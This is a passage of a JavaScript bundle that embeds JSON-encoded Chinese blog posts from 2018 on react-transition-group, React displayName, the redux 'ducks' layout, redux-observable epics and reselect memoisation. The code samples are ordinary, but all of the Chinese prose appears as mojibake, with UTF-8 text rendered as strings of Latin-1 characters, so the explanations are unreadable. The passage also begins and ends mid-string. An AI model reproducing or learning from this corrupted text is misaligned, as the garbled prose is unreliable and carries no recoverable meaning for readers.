class=\\"hljs-comment\\">//å­ç»„ä»¶ï¼ˆéœ€è¦åŠ¨ç”»çš„ç»„ä»¶ï¼‰</span>\\n&lt;<span class=\\"hljs-regexp\\">/CSSTransition&gt;</span></code></pre></code></pre>\\n<p>cssä¸­è®¾ç½®å¦‚ä¸‹ï¼š</p>\\n<pre><code class=\\"language-css\\"><pre class=\\"hljs\\"><code>.fade-enter {\\n  opacity: 0.01;\\n}\\n.fade-enter-active {\\n  opacity: 1;\\n  transition: opacity 300ms;\\n}\\n.fade-exit {\\n  opacity: 1;\\n}\\n.fade-exit-active {\\n  opacity: 0.01;\\n  transition: opacity 300ms;\\n}</code></pre></code></pre>\\n<h4 id=\\"transitiongroup\\">TransitionGroup</h4>\\n<p>ç®¡ç†ä¸€äº›åˆ—ç»„ä»¶çš„åŠ¨ç”»ï¼Œä¾‹å¦‚åˆ—è¡¨</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>&lt;ul&gt;\\n  &lt;TransitionGroup&gt;\\n    {items.map(({ id, text }) =&gt; (\\n      &lt;CSSTransition\\n        key={id}\\n        timeout={500}\\n        classNames=\\"fade\\"\\n      &gt;\\n        &lt;li&gt;{text}&lt;/li&gt;\\n      &lt;/CSSTransition&gt;\\n    ))}\\n  &lt;/TransitionGroup&gt;\\n&lt;<span class=\\"hljs-regexp\\">/ul&gt;</span></code></pre></code></pre>\\n<h4 id=\\"chang-yong-shu-xing\\">å¸¸ç”¨å±æ€§</h4>\\n<ul>\\n<li>children</li>\\n</ul>\\n<p>å½“childrenæ˜¯ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œæ¥å—ä¸€ä¸ªå‚æ•°stateï¼ŒstateåŒ…å«äº†å†…éƒ¨ç»„ä»¶çš„transitionçŠ¶æ€\\n<code>&#39;entering&#39;, &#39;entered&#39;, &#39;exiting&#39;, &#39;exited&#39;, &#39;unmounted&#39;</code></p>\\n<ul>\\n<li>in</li>\\n</ul>\\n<p>å®šä¹‰å½“å‰ç»„ä»¶çš„çŠ¶æ€(trueä¸ºenteredï¼Œfalseä¸ºexited)</p>\\n<ul>\\n<li>unmountOnExit </li>\\n</ul>\\n<p>å½“çŠ¶æ€ä¸ºexitedçš„æ—¶å€™æ˜¯å¦éœ€è¦unmount</p>\\n<ul>\\n<li>timeout </li>\\n</ul>\\n<p>å®šä¹‰transitioné—´éš”ï¼Œå¯ä»¥è¿™ä¹ˆå†™ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code>timeout={{\\n  <span class=\\"hljs-attr\\">enter</span>:<span class=\\"hljs-number\\">300</span>,\\n  <span class=\\"hljs-attr\\">exit</span>:<span class=\\"hljs-number\\">300</span>\\n}}</code></pre></code></pre>\\n","toc":[{"anchor":"reacttransitiongroup","level":4,"text":"ReactTransitionGroup"},{"anchor":"transition","level":4,"text":"Transition"},{"anchor":"csstransition","level":2,"text":"CSSTransition"},{"anchor":"transitiongroup","level":4,"text":"TransitionGroup"},{"anchor":"chang-yong-shu-xing","level":4,"text":"å¸¸ç”¨å±æ€§"}],"relatedTags":null,"created_at":"2018-06-20","timeArr":[2018,5,20,0,0,0,0],"title":"react-transition-group","uuid":"a016c3917edd52dc61593c47a19f112ce3e57081","summary":"<h4>ReactTransitionGroup</h4>\\n<h4>Transition</h4>\\n<p>é»˜è®¤å±•ç¤ºç»„ä»¶æŸä¸ªç‰¹å®šçŠ¶æ€çš„æ ·å¼ï¼Œè€Œä¸æ˜¯åˆ›å»ºæ¸å˜åŠ¨ç”»</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre class=\\"hljs\\"><code>&lt;Transition\\n        <span class=\\"hljs-keyword\\">in</span>={toggleShow}\\n        timeout={<span class=\\"hljs-number\\">1000</span>}\\n        unmountOnEx...</code></pre>","slug":"react-transition-group","sha":"2c184a72cccb6e8c5cb04541f46eb06b15533efa"}')},630:function(n){n.exports=JSON.parse('{"content":"<p><code>displayName</code>å®šä¹‰è°ƒè¯•æ—¶çš„ç»„ä»¶nameï¼Œä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-jsx\\"><pre class=\\"hljs\\"><code> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">withHOC</span>(<span class=\\"hljs-params\\">WrapComponent</span>) </span>{\\n   <span class=\\"hljs-comment\\">// æ­¤å¤„æœªå®šä¹‰åç§°æˆ–è€…å¸Œæœ›åŠ¨æ€å®šä¹‰åç§°</span>\\n   <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n     <span class=\\"hljs-comment\\">// å®šä¹‰displayName</span>\\n     <span class=\\"hljs-keyword\\">static</span> displayName = <span class=\\"hljs-string\\">`withHOC(<span class=\\"hljs-subst\\">${WrapComponent.displayName || WrapComponent.name}</span>)`</span>;\\n     render(){\\n       <span class=\\"hljs-built_in\\">console</span>.log(<span class=\\"hljs-string\\">\\"inside HOC\\"</span>)\\n       <span class=\\"hljs-keyword\\">return</span> &lt;WrapComponent {...this.props } /&gt;;\\n     }\\n   }\\n }\\n\\n App = withHOC(App);</code></pre></code></pre>\\n<p>å¦‚æœæœªå®šä¹‰displayNameï¼Œé‚£ä¹ˆè¿›è¡Œè°ƒè¯•çš„æ—¶å€™ï¼Œå°±ä¼šæ˜¾ç¤ºå¦‚ä¸‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>// reactè‡ªåŠ¨å®šä¹‰åç§°\\n|---_class2\\n  |---App\\n    ...</code></pre></code></pre><p>å®šä¹‰displayNameåï¼Œæ˜¾ç¤ºå¦‚ä¸‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>|---withHOC(App)\\n  |---App\\n    ...</code></pre></code></pre>","toc":[],"relatedTags":null,"created_at":"2018-06-16","timeArr":[2018,5,16,0,0,0,0],"title":"reactComponent.displayName","uuid":"518351f05dc93d811b1d88f9c35718525adb0e07","summary":"<p><code>displayName</code>å®šä¹‰è°ƒè¯•æ—¶çš„ç»„ä»¶nameï¼Œä¾‹å¦‚ï¼š</p>\\n<pre class=\\"hljs\\"><code> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">withHOC</span>(<span class=\\"hljs-params\\">WrapComponent</span>) </span>{\\n   <span class=\\"hljs-comment\\">// æ­¤å¤„æœªå®šä¹‰åç§°æˆ–è€…å¸Œæœ›åŠ¨æ€å®šä¹‰åç§°</span>\\n   <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">class</span> <span class=\\"hljs-keyword\\">extends</span> <span class=\\"hljs-title\\">React</span>.<span class=\\"hljs-title\\">Component</span> </span>{\\n     <span class=\\"hljs-comment\\">// å®šä¹‰displayName</span>\\n...</code></pre>","slug":"reactComponent.displayName","sha":"fde82993f585c209a25f00c57ea4fb1713626d27"}')},631:function(n){n.exports=JSON.parse('{"content":"<ul>\\n<li>ä¹‹å‰çš„é¡¹ç›®æ¶æ„å†™æ³•<pre><code><pre class=\\"hljs\\"><code>product/\\nâ”œâ”€â”€ product.js\\nâ”œâ”€â”€ constant.js\\nâ”œâ”€â”€ productActions.js\\nâ”œâ”€â”€ productReducers.js\\n...\\nwidget/\\nâ”œâ”€â”€ widget.js\\nâ”œâ”€â”€ constant.js\\nâ”œâ”€â”€ widgetActions.js\\nâ”œâ”€â”€ widgetReducers.js\\n...\\nlogin/\\nâ”œâ”€â”€ login.js\\nâ”œâ”€â”€ constant.js\\nâ”œâ”€â”€ loginActions.js\\nâ”œâ”€â”€ reducers.js\\n  â”œâ”€â”€index.js\\n  â”œâ”€â”€someReducer2.js\\n  â”œâ”€â”€someReducer1.js\\n          ...\\n...\\ngallery/\\nâ”œâ”€â”€ gallery.js\\nâ”œâ”€â”€ constant.js\\nâ”œâ”€â”€ action/\\n  â”œâ”€â”€someAction1.js\\n  â”œâ”€â”€someAction2.js\\n          ...\\nâ”œâ”€â”€ galleryReducers.js\\n...</code></pre></code></pre>é™¤äº†è¿™ç§ç±»ä¼¼æŒ‰åŠŸèƒ½åˆ’åˆ†ï¼Œè¿˜æœ‰å…¶ä»–ï¼Œä¾‹å¦‚dump/smart componentç­‰</li>\\n</ul>\\n<p>è¿™äº›æœ‰ä¸€ä¸ªç‰¹ç‚¹ï¼Œåˆ’åˆ†çš„å¾ˆç»†ï¼Œè€Œä¸”å¾ˆæŠ½è±¡ï¼ŒåŸºæœ¬ä¸Šé¢å¯¹ä»»ä½•åŠŸèƒ½ï¼Œéƒ½æ˜¯åŒä¸€å¥—æ¨¡æ¿ï¼Œä½†ä½ ä¹Ÿæœ‰å¯èƒ½é¢å¯¹ä¸€ä¸ªç®€å•çš„é€»è¾‘ï¼Œç¡®å»æŸ¥æ‰¾äº†4-5ä¸ªæ–‡ä»¶</p>\\n<h2 id=\\"ya-zi-lei-xing-de-xie-fa\\">é¸­å­ç±»å‹çš„å†™æ³•</h2>\\n<pre><code><pre class=\\"hljs\\"><code>duck/\\nâ”œâ”€â”€ product.js\\nâ”œâ”€â”€ login.js\\nâ”œâ”€â”€ gallery.js\\nâ”œâ”€â”€ widget.js\\n...</code></pre></code></pre><p>å°±æ˜¯å°†æ¯ä¸ªåŠŸèƒ½æ¿å—çš„action,reducerç­‰åˆå¹¶åˆ°ä¸€èµ·ï¼Œä½†éœ€è¦éµå®ˆå‡ ä¸ªè§„åˆ™ï¼š</p>\\n<ol>\\n<li>å¿…é¡» export default å‡½æ•°åä¸º reducer() çš„ reducer</li>\\n<li>å¿…é¡» ä½œä¸ºå‡½æ•° export å®ƒçš„ action creators</li>\\n<li>å¿…é¡» æŠŠ action types å®šä¹‰æˆå½¢ä¸º npm-module-or-app/reducer/ACTION_TYPE çš„å­—ç¬¦ä¸²</li>\\n<li>å¦‚æœæœ‰å¤–éƒ¨çš„reduceréœ€è¦ç›‘å¬è¿™ä¸ªaction typeï¼Œæˆ–è€…ä½œä¸ºå¯é‡ç”¨çš„åº“å‘å¸ƒæ—¶ï¼Œ å¯ä»¥ ç”¨ UPPER_SNAKE_CASE å½¢å¼ export å®ƒçš„ action typesã€‚</li>\\n</ol>\\n<p>å…¶ä¸­ç¬¬ä¸‰æ¡æ˜¯å¿…é¡»è§„å®šè¿™ä¹ˆå†™type</p>\\n<p><code>const LOAD   = &#39;my-app/widgets/LOAD&#39;</code></p>\\n<p>ä»¥è·¯å¾„çš„æ–¹å¼å®šä¹‰type</p>\\n<p>è‡³äºåŸå› è¿˜ä¸å¤ªç†è§£ï¼Œå¯èƒ½æ˜¯å½“åº”ç”¨å¤æ‚çš„æ—¶å€™ä¹Ÿèƒ½æ­£ç¡®åŒºåˆ†æ¯ä¸€ä¸ªtypeï¼Œè€Œä¸”è·¯å¾„å‘½åæ¯”è¾ƒå¥½æ‰¾ï¼Ÿ</p>\\n<p>å½“éµå®ˆäº†ä»¥ä¸Šè§„åˆ™ï¼Œå…¶duckå†…éƒ¨æ–‡ä»¶å†…å®¹å°±æœ‰ç‚¹ç±»ä¼¼é‡‘å­—å¡”å½¢çŠ¶äº†ï¼Œ</p>\\n<pre><code><pre class=\\"hljs\\"><code>â”œâ”€â”€product.js (export default combineReducer(...))\\n\\n             combineReducer\\n                   |    \\n             reducer reducer\\n            /      |       \\\\\\n        action action action action\\n        /          |           \\\\\\n    type type type type type type type type\\n</code></pre></code></pre><p>è¿™ç§ç»“æ„å½“æˆ‘ä»¬é’ˆå¯¹æŸä¸ªåŠŸèƒ½è¿›è¡Œé˜…è¯»æˆ–è€…ä¿®æ”¹ï¼Œç¡®å®æ–¹ä¾¿ï¼ˆéƒ½åœ¨ä¸€ä¸ªæ–‡ä»¶å†…éƒ¨ï¼‰ï¼Œæ€§èƒ½ä¹Ÿç›¸å¯¹ä¼šæå‡ï¼ˆä¸ä¼šé‚£ä¹ˆå¤šè°ƒç”¨ï¼‰</p>\\n<p>ä½†æ˜¯ä¸ªäººè®¤ä¸ºé¡¹ç›®å¤§åˆ°ä¸€å®šç¨‹åº¦ï¼ŒæŸä¸ªåŠŸèƒ½çš„æ–‡ä»¶å†…å®¹å¤šåˆ°ä¸€å®šç¨‹åº¦ï¼Œè¿˜æ˜¯éœ€è¦åˆ†å‰²ï¼Œæˆ–è®¸å¯ä»¥å†™æˆï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>duck/\\nâ”œâ”€â”€ product\\n    â”œâ”€â”€ productActions.js\\n    â”œâ”€â”€ productReducers.js\\n    â”œâ”€â”€ productTypes.js\\nâ”œâ”€â”€ login.js\\nâ”œâ”€â”€ gallery.js\\nâ”œâ”€â”€ widget.js\\n...</code></pre></code></pre><p>è¿™ç§æ··åˆæ¨¡å¼å¯èƒ½æ¯”è¾ƒé€‚åˆã€‚</p>\\n","toc":[{"anchor":"ya-zi-lei-xing-de-xie-fa","level":2,"text":"é¸­å­ç±»å‹çš„å†™æ³•"}],"relatedTags":null,"created_at":"2018-06-15","timeArr":[2018,5,15,0,0,0,0],"title":"reduxçš„é¸­å­ç±»å‹","uuid":"4a83e73cdbfb044bbcaeec9d58a931ead5069ff7","summary":"<ul>\\n<li>ä¹‹å‰çš„é¡¹ç›®æ¶æ„å†™æ³•</li>\\n</ul>\\n<pre class=\\"hljs\\"><code>product/\\nâ”œâ”€â”€ product.js\\nâ”œâ”€â”€ constant.js\\nâ”œâ”€â”€ productActions.js\\nâ”œâ”€â”€ productReducers.js\\n...\\nwidget/\\nâ”œâ”€â”€ widget.js\\nâ”œâ”€â”€ constant.js\\nâ”œâ”€â”€ widgetActions...</code></pre>","slug":"redux-de-ya-zi-lei-xing","sha":"fb8d734075bef018a7449f06ddd06ffbb203848f"}')},632:function(n){n.exports=JSON.parse('{"content":"<h3 id=\\"yi\\">ä¸€</h3>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> pingEpic = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action$</span> =&gt;</span>\\n  action$.filter(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span> action.type === <span class=\\"hljs-string\\">\'PING\'</span>)\\n    .mapTo({ <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'PONG\'</span> });</code></pre></code></pre>\\n<blockquote>\\n<p>pingEpic ä¼šç›‘å¬ç±»å‹ä¸º PING çš„ actionsï¼Œç„¶åæŠ•å°„ä¸ºæ–°çš„ actionï¼ŒPONGã€‚è¿™ä¸ªä¾‹å­åŠŸèƒ½ä¸Šç›¸å½“äºåšäº†è¿™ä»¶äº‹æƒ…:</p>\\n</blockquote>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>dispatch({ <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'PING\'</span> });\\ndispatch({ <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'PONG\'</span> });</code></pre></code></pre>\\n<blockquote>\\n<p>ç‰¢è®°: Epics è¿è¡Œåœ¨æ­£å¸¸åˆ†å‘æ¸ é“æ—, åœ¨ reducers å®Œå…¨æ¥å—åˆ°å®ƒä»¬ä¹‹åã€‚å½“ä½ å°†ä¸€ä¸ª action æŠ•å°„æˆå¦ä¸€ä¸ª actionï¼Œ\\nä½ ä¸ä¼š é˜»æ­¢åŸå§‹çš„ action åˆ°è¾¾ reducers; è¯¥ action å·²ç»é€šè¿‡äº†å®ƒ!</p>\\n</blockquote>\\n<p>ç†è§£ï¼š</p>\\n<p>é€šè¿‡æŸ¥çœ‹reduxæºç ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>\\n<span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">dispatch</span>(<span class=\\"hljs-params\\">action</span>) </span>{\\n    <span class=\\"hljs-comment\\">//...ä¸€äº›åˆ¤æ–­</span>\\n\\n    <span class=\\"hljs-comment\\">// dispatchå®é™…æ“ä½œï¼ˆé¡ºåºï¼šå…ˆæ›´æ–°stateï¼Œå†æ‰§è¡Œç›‘å¬ï¼‰</span>\\n    <span class=\\"hljs-keyword\\">try</span> {\\n      isDispatching = <span class=\\"hljs-literal\\">true</span>\\n      <span class=\\"hljs-comment\\">// æ›´æ–°currentState</span>\\n      currentState = currentReducer(currentState, action)\\n    } <span class=\\"hljs-keyword\\">finally</span> {\\n      isDispatching = <span class=\\"hljs-literal\\">false</span>\\n    }\\n    <span class=\\"hljs-comment\\">// éå†æ‰§è¡Œæ¯ä¸€ä¸ªç›‘å¬</span>\\n    <span class=\\"hljs-keyword\\">const</span> listeners = (currentListeners = nextListeners)\\n    <span class=\\"hljs-keyword\\">for</span> (<span class=\\"hljs-keyword\\">let</span> i = <span class=\\"hljs-number\\">0</span>; i &lt; listeners.length; i++) {\\n      <span class=\\"hljs-keyword\\">const</span> listener = listeners[i]\\n      listener()\\n    }\\n\\n    <span class=\\"hljs-keyword\\">return</span> action\\n  }</code></pre></code></pre>\\n<p>å¯ä»¥çœ‹å‡ºæ˜¯å…ˆæ›´æ–°stateï¼Œè¯´æ˜ä¸€å¼€å§‹çš„actionå·²ç»æ‰§è¡Œäº†ï¼Œç„¶åæ‰å»æ‰§è¡Œlistener(å³è¿™é‡Œçš„Epics)</p>\\n<h3 id=\\"er\\">äºŒ</h3>\\n<p>è¿™é‡Œåˆ°åº•å‘ç”Ÿäº†ä»€ä¹ˆ</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> fetchUser = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">username</span> =&gt;</span> ({ <span class=\\"hljs-attr\\">type</span>: FETCH_USER, <span class=\\"hljs-attr\\">payload</span>: username });\\n<span class=\\"hljs-keyword\\">const</span> fetchUserFulfilled = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">payload</span> =&gt;</span> ({ <span class=\\"hljs-attr\\">type</span>: FETCH_USER_FULFILLED, payload });\\n\\n\\n<span class=\\"hljs-keyword\\">const</span> fetchUserEpic = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action$</span> =&gt;</span>\\n  action$.ofType(FETCH_USER)\\n    .mergeMap(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span>\\n      ajax.getJSON(<span class=\\"hljs-string\\">`https://api.github.com/users/<span class=\\"hljs-subst\\">${action.payload}</span>`</span>)\\n        .map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">response</span> =&gt;</span> fetchUserFulfilled(response))\\n    );</code></pre></code></pre>\\n<p>æˆ‘ä»¬ç”¨reduxçš„æ—¶å€™å†™reduceræ˜¯<code>action</code>å…¥ï¼Œ<code>state</code>å‡ºï¼Œç¼–å†™å®Œæˆåé€šè¿‡<code>combineReducers</code>åˆå¹¶ï¼Œå†é€šè¿‡<code>createStore</code>æ·»åŠ </p>\\n<p>è¿™æ˜¯ä¸€ä¸ªreducer:</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> users = <span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">state = {}, action</span>) =&gt;</span> {\\n  <span class=\\"hljs-keyword\\">switch</span> (action.type) {\\n    <span class=\\"hljs-keyword\\">case</span> FETCH_USER_FULFILLED:\\n      <span class=\\"hljs-keyword\\">return</span> {\\n        ...state,\\n        <span class=\\"hljs-comment\\">// `login` is the username</span>\\n        [action.payload.login]: action.payload\\n      };\\n\\n    <span class=\\"hljs-keyword\\">default</span>:\\n      <span class=\\"hljs-keyword\\">return</span> state;\\n  }\\n};</code></pre></code></pre>\\n<p>è€Œè¿™é‡Œåˆ™æ˜¯ç¼–å†™epicï¼Œ<code>action$</code>å…¥ï¼Œ<code>action$</code>å‡ºï¼Œè¿™ä¸¤ä¸ªaction$æµä¸èƒ½æ˜¯åŒä¸€ä¸ªï¼Œç¼–å†™å®Œæˆåï¼Œé€šè¿‡<code>combineEpics</code>åˆå¹¶ï¼Œ\\nå†é€šè¿‡<code>createEpicMiddleware</code>åˆ›å»ºï¼Œæœ€åé€šè¿‡<code>applyMiddleware</code>åŠ å…¥åˆ°<code>createStore</code>ä¸­</p>\\n<p>è¿™æ˜¯ä¸€ä¸ªepic:</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> fetchUserEpic = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action$</span> =&gt;</span>\\n  action$.ofType(FETCH_USER)\\n    .mergeMap(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span>\\n      ajax.getJSON(<span class=\\"hljs-string\\">`https://api.github.com/users/<span class=\\"hljs-subst\\">${action.payload}</span>`</span>)\\n        .map(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">response</span> =&gt;</span> fetchUserFulfilled(response))\\n    );</code></pre></code></pre>\\n<p>å› æ­¤ï¼Œè§£é‡Šä¸Šé¢é‚£ä¸€æ®µï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>// å®šä¹‰2ä¸ªcation\\nconst fetchUser = username =&gt; ({ type: FETCH_USER, payload: username });\\nconst fetchUserFulfilled = payload =&gt; ({ type: FETCH_USER_FULFILLED, payload });\\n\\n// å®šä¹‰ä¸€ä¸ªepicï¼Œå…¥å£action$ä¸ºæ¯ä¸€ä¸ªactionç»„æˆçš„æµ\\nconst fetchUserEpic = action$ =&gt;\\n  // æœç´¢å‡ºtypeä¸ºFETCH_USERçš„action\\n  action$.ofType(FETCH_USER)\\n    // mergeMapæ–¹æ³•ï¼Œç®€å•æ¥è¯´å°±æ˜¯å°†å†…éƒ¨æºçš„è¾“å‡ºåˆå¹¶åˆ°å¤–éƒ¨æºä¸­ï¼Œç„¶åä¸€èµ·è¾“å‡º\\n    // å†ç®€å•è¯´ï¼Œå°±æ˜¯è¿™ä¸ªepicçš„å‡ºå£å°±æ˜¯fetchUserFulfilled(response)è¿™ä¸ªactionç»„æˆçš„æµ\\n    .mergeMap(action =&gt;\\n      ajax.getJSON(`https://api.github.com/users/${action.payload}`)\\n        .map(response =&gt; fetchUserFulfilled(response))\\n    );</code></pre></code></pre><p>ç„¶åé€šè¿‡redux-observableæºç ä¸­<code>result$.subscribe(store.dispatch)</code>ï¼Œå› ä¸ºstore.dispatchæ˜¯ä¸€ä¸ªæ¥å—actionçš„å‡½æ•°ï¼ˆçœ‹ä¸€ï¼‰ï¼Œ\\nè€Œresult$è¿™é‡Œå°±æ˜¯actionç»„æˆçš„æµï¼Œå› æ­¤è¿™ä¸ªè®¢é˜…å®é™…ç»“æœå°±æ˜¯<code>store.dispatch(action$æµä¸­çš„æ¯ä¸€ä¸ªaction)</code>ï¼ŒçœŸçš„å¾ˆç²¾å¦™ï¼</p>\\n<p>ä¸çŸ¥é“æ˜¯å¦è¯´æ¸…æ¥šäº†ï¼Œæ„Ÿè§‰è¿˜æŒºç»•çš„ï¼Œä¸è¿‡é€šè¿‡æ–‡æ¡£å’Œæºç ç»“åˆä¹Ÿèƒ½æ…¢æ…¢ç¼•æ¸…æ€è·¯ã€‚</p>\\n","toc":[{"anchor":"yi","level":3,"text":"ä¸€"},{"anchor":"er","level":3,"text":"äºŒ"}],"relatedTags":null,"created_at":"2018-06-12","timeArr":[2018,5,12,0,0,0,0],"title":"redux-observableç¬”è®°1","uuid":"476aa40826f78ed929e4d188e5272ba3b366c415","summary":"<h4>ä¸€</h4>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> pingEpic = <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action$</span> =&gt;</span>\\n  action$.filter(<span class=\\"hljs-function\\"><span class=\\"hljs-params\\">action</span> =&gt;</span> action.type === <span class=\\"hljs-string\\">\'PING\'</span>)\\n    .mapTo({ <span class=\\"hljs-attr\\">type</span>: <span class=\\"hljs-string\\">\'PONG\'</span> });\\n</code></pre>\\n<blockquote>\\n<p>pingEpic ä¼šç›‘å¬ç±»å‹ä¸º PING çš„ actionsï¼Œç„¶åæŠ•...</p>\\n</blockquote>","slug":"redux-observable-bi-ji-1","sha":"2c3ca78c66c568c2182c1a0a3db4f01790f268e3"}')},633:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"reselect\\">Reselect</h2>\\n<p>å½“æˆ‘ä»¬ä½¿ç”¨reduxçš„<code>connect(mapStateToProps)</code>çš„æ—¶å€™</p>\\n<p>æœ‰æ—¶å€™storeçš„æ•°æ®ç›´æ¥ä¼ è¿›ç»„ä»¶å¹¶ä¸å¥½ï¼Œäºæ˜¯æˆ‘ä»¬å¸Œæœ›åœ¨å°†æ•°æ®ä¼ è¿›ç»„ä»¶å‰ï¼Œè¿›è¡Œè°ƒæ•´</p>\\n<p>ä¾‹å¦‚ storeå¦‚ä¸‹</p>\\n<pre><code><pre class=\\"hljs\\"><code>const mockStore={\\n  descriptions:[\\n    {name:&quot;a&quot;,age:25},\\n    {name:&quot;b&quot;,age:38},\\n    {name:&quot;c&quot;,age:26}\\n  ]\\n}</code></pre></code></pre><p>æˆ‘ä»¬å¸Œæœ›ä¼ è¿›ç»„ä»¶çš„æ•°æ®å¦‚ä¸‹ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>{\\n  descriptions:{\\n    name:[&quot;a&quot;,&quot;b&quot;,&quot;c&quot;],\\n    age:[25,38,26]\\n  }\\n}</code></pre></code></pre><p>é€šå¸¸çš„åŠæ³•ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> mapStateToProps=<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">state</span>)=&gt;</span>{\\n  <span class=\\"hljs-keyword\\">const</span> newDescriptions={}\\n  state.descriptions.forEach(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">obj</span>)=&gt;</span>{\\n    <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> key <span class=\\"hljs-keyword\\">in</span> obj){\\n      <span class=\\"hljs-keyword\\">if</span>(obj.hasOwnProperty(key)){\\n        <span class=\\"hljs-keyword\\">if</span>(!newDescriptions[key]){\\n          newDescriptions[key]=[]\\n        }\\n        newDescriptions[key].push(obj[key])\\n      }\\n    }\\n  })\\n  <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">descriptions</span>:newDescriptions}\\n}\\n<span class=\\"hljs-built_in\\">console</span>.log(mapStateToProps(mockStore)===mapStateToProps(mockStore))\\n<span class=\\"hljs-comment\\">// false</span></code></pre></code></pre>\\n<p>ç¼ºé™·ï¼šå¾ˆæ˜æ˜¾è¿™é‡Œæ¯æ¬¡æ‰§è¡Œéƒ½ä¼šè¿”å›ä¸€ä¸ªå…¨æ–°çš„å¯¹è±¡ï¼Œå› æ­¤reduxçš„æµ…å¯¹æ¯”å°±ä¼šå¤±æ•ˆï¼Œé€ æˆå¤šæ¬¡é‡å¤æ¸²æŸ“</p>\\n<p>ä½¿ç”¨reselect</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">import</span> {createSelector} <span class=\\"hljs-keyword\\">from</span> <span class=\\"hljs-string\\">\'reselect\'</span>\\n\\n<span class=\\"hljs-keyword\\">const</span> selectState=createSelector(\\n  <span class=\\"hljs-function\\"><span class=\\"hljs-params\\">state</span>=&gt;</span>state.descriptions,\\n  descriptions=&gt;{\\n    <span class=\\"hljs-keyword\\">const</span> newDescriptions={}\\n    descriptions.forEach(<span class=\\"hljs-function\\">(<span class=\\"hljs-params\\">obj</span>)=&gt;</span>{\\n      <span class=\\"hljs-keyword\\">for</span>(<span class=\\"hljs-keyword\\">let</span> key <span class=\\"hljs-keyword\\">in</span> obj){\\n        <span class=\\"hljs-keyword\\">if</span>(obj.hasOwnProperty(key)){\\n          <span class=\\"hljs-keyword\\">if</span>(!newDescriptions[key]){\\n            newDescriptions[key]=[]\\n           }\\n           newDescriptions[key].push(obj[key])\\n        }\\n      }\\n    })\\n    <span class=\\"hljs-keyword\\">return</span> {<span class=\\"hljs-attr\\">descriptions</span>:newDescriptions}\\n  }\\n)\\n<span class=\\"hljs-built_in\\">console</span>.log(selectState(mockStore)===selectState(mockStore))\\n<span class=\\"hljs-comment\\">// true</span></code></pre></code></pre>\\n<p>é€šè¿‡æµ‹è¯•ï¼Œä¼šå‘ç°ï¼Œæ¯æ¬¡çš„è¿”å›å€¼éƒ½æ˜¯å¼•ç”¨ç›¸ç­‰çš„(===)ï¼ŒåŸå› æ˜¯å› ä¸ºreselectå†…éƒ¨ä½¿ç”¨äº†ç¼“å­˜ï¼Œ\\nå½“å‚æ•°(mockStore)ç›¸åŒï¼Œç›´æ¥è¿”å›ç¼“å­˜çš„ç»“æœ</p>\\n<p>æ³¨æ„ï¼šæ¯”è¾ƒå‚æ•°æ˜¯å»ºç«‹åœ¨æˆ‘ä»¬ç¼–å†™<em>çº¯å‡½æ•°</em>çš„åŸºç¡€ä¸Šï¼Œå¦‚æœå†…éƒ¨ä¸æ˜¯çº¯å‡½æ•°ï¼Œä½†å‚æ•°ç›¸åŒï¼Œä¹Ÿä¼šè¿”å›ç¼“å­˜å€¼ï¼Œå°±å¾ˆå¯èƒ½ä¼šé€ æˆæ„å¤–çš„bug</p>\\n<p><a href=\\"https://gist.github.com/stonehank/c5de2a4318ee9954503770047c998c7b\\">è¯¦ç»†ä»£ç </a></p>\\n<p><a 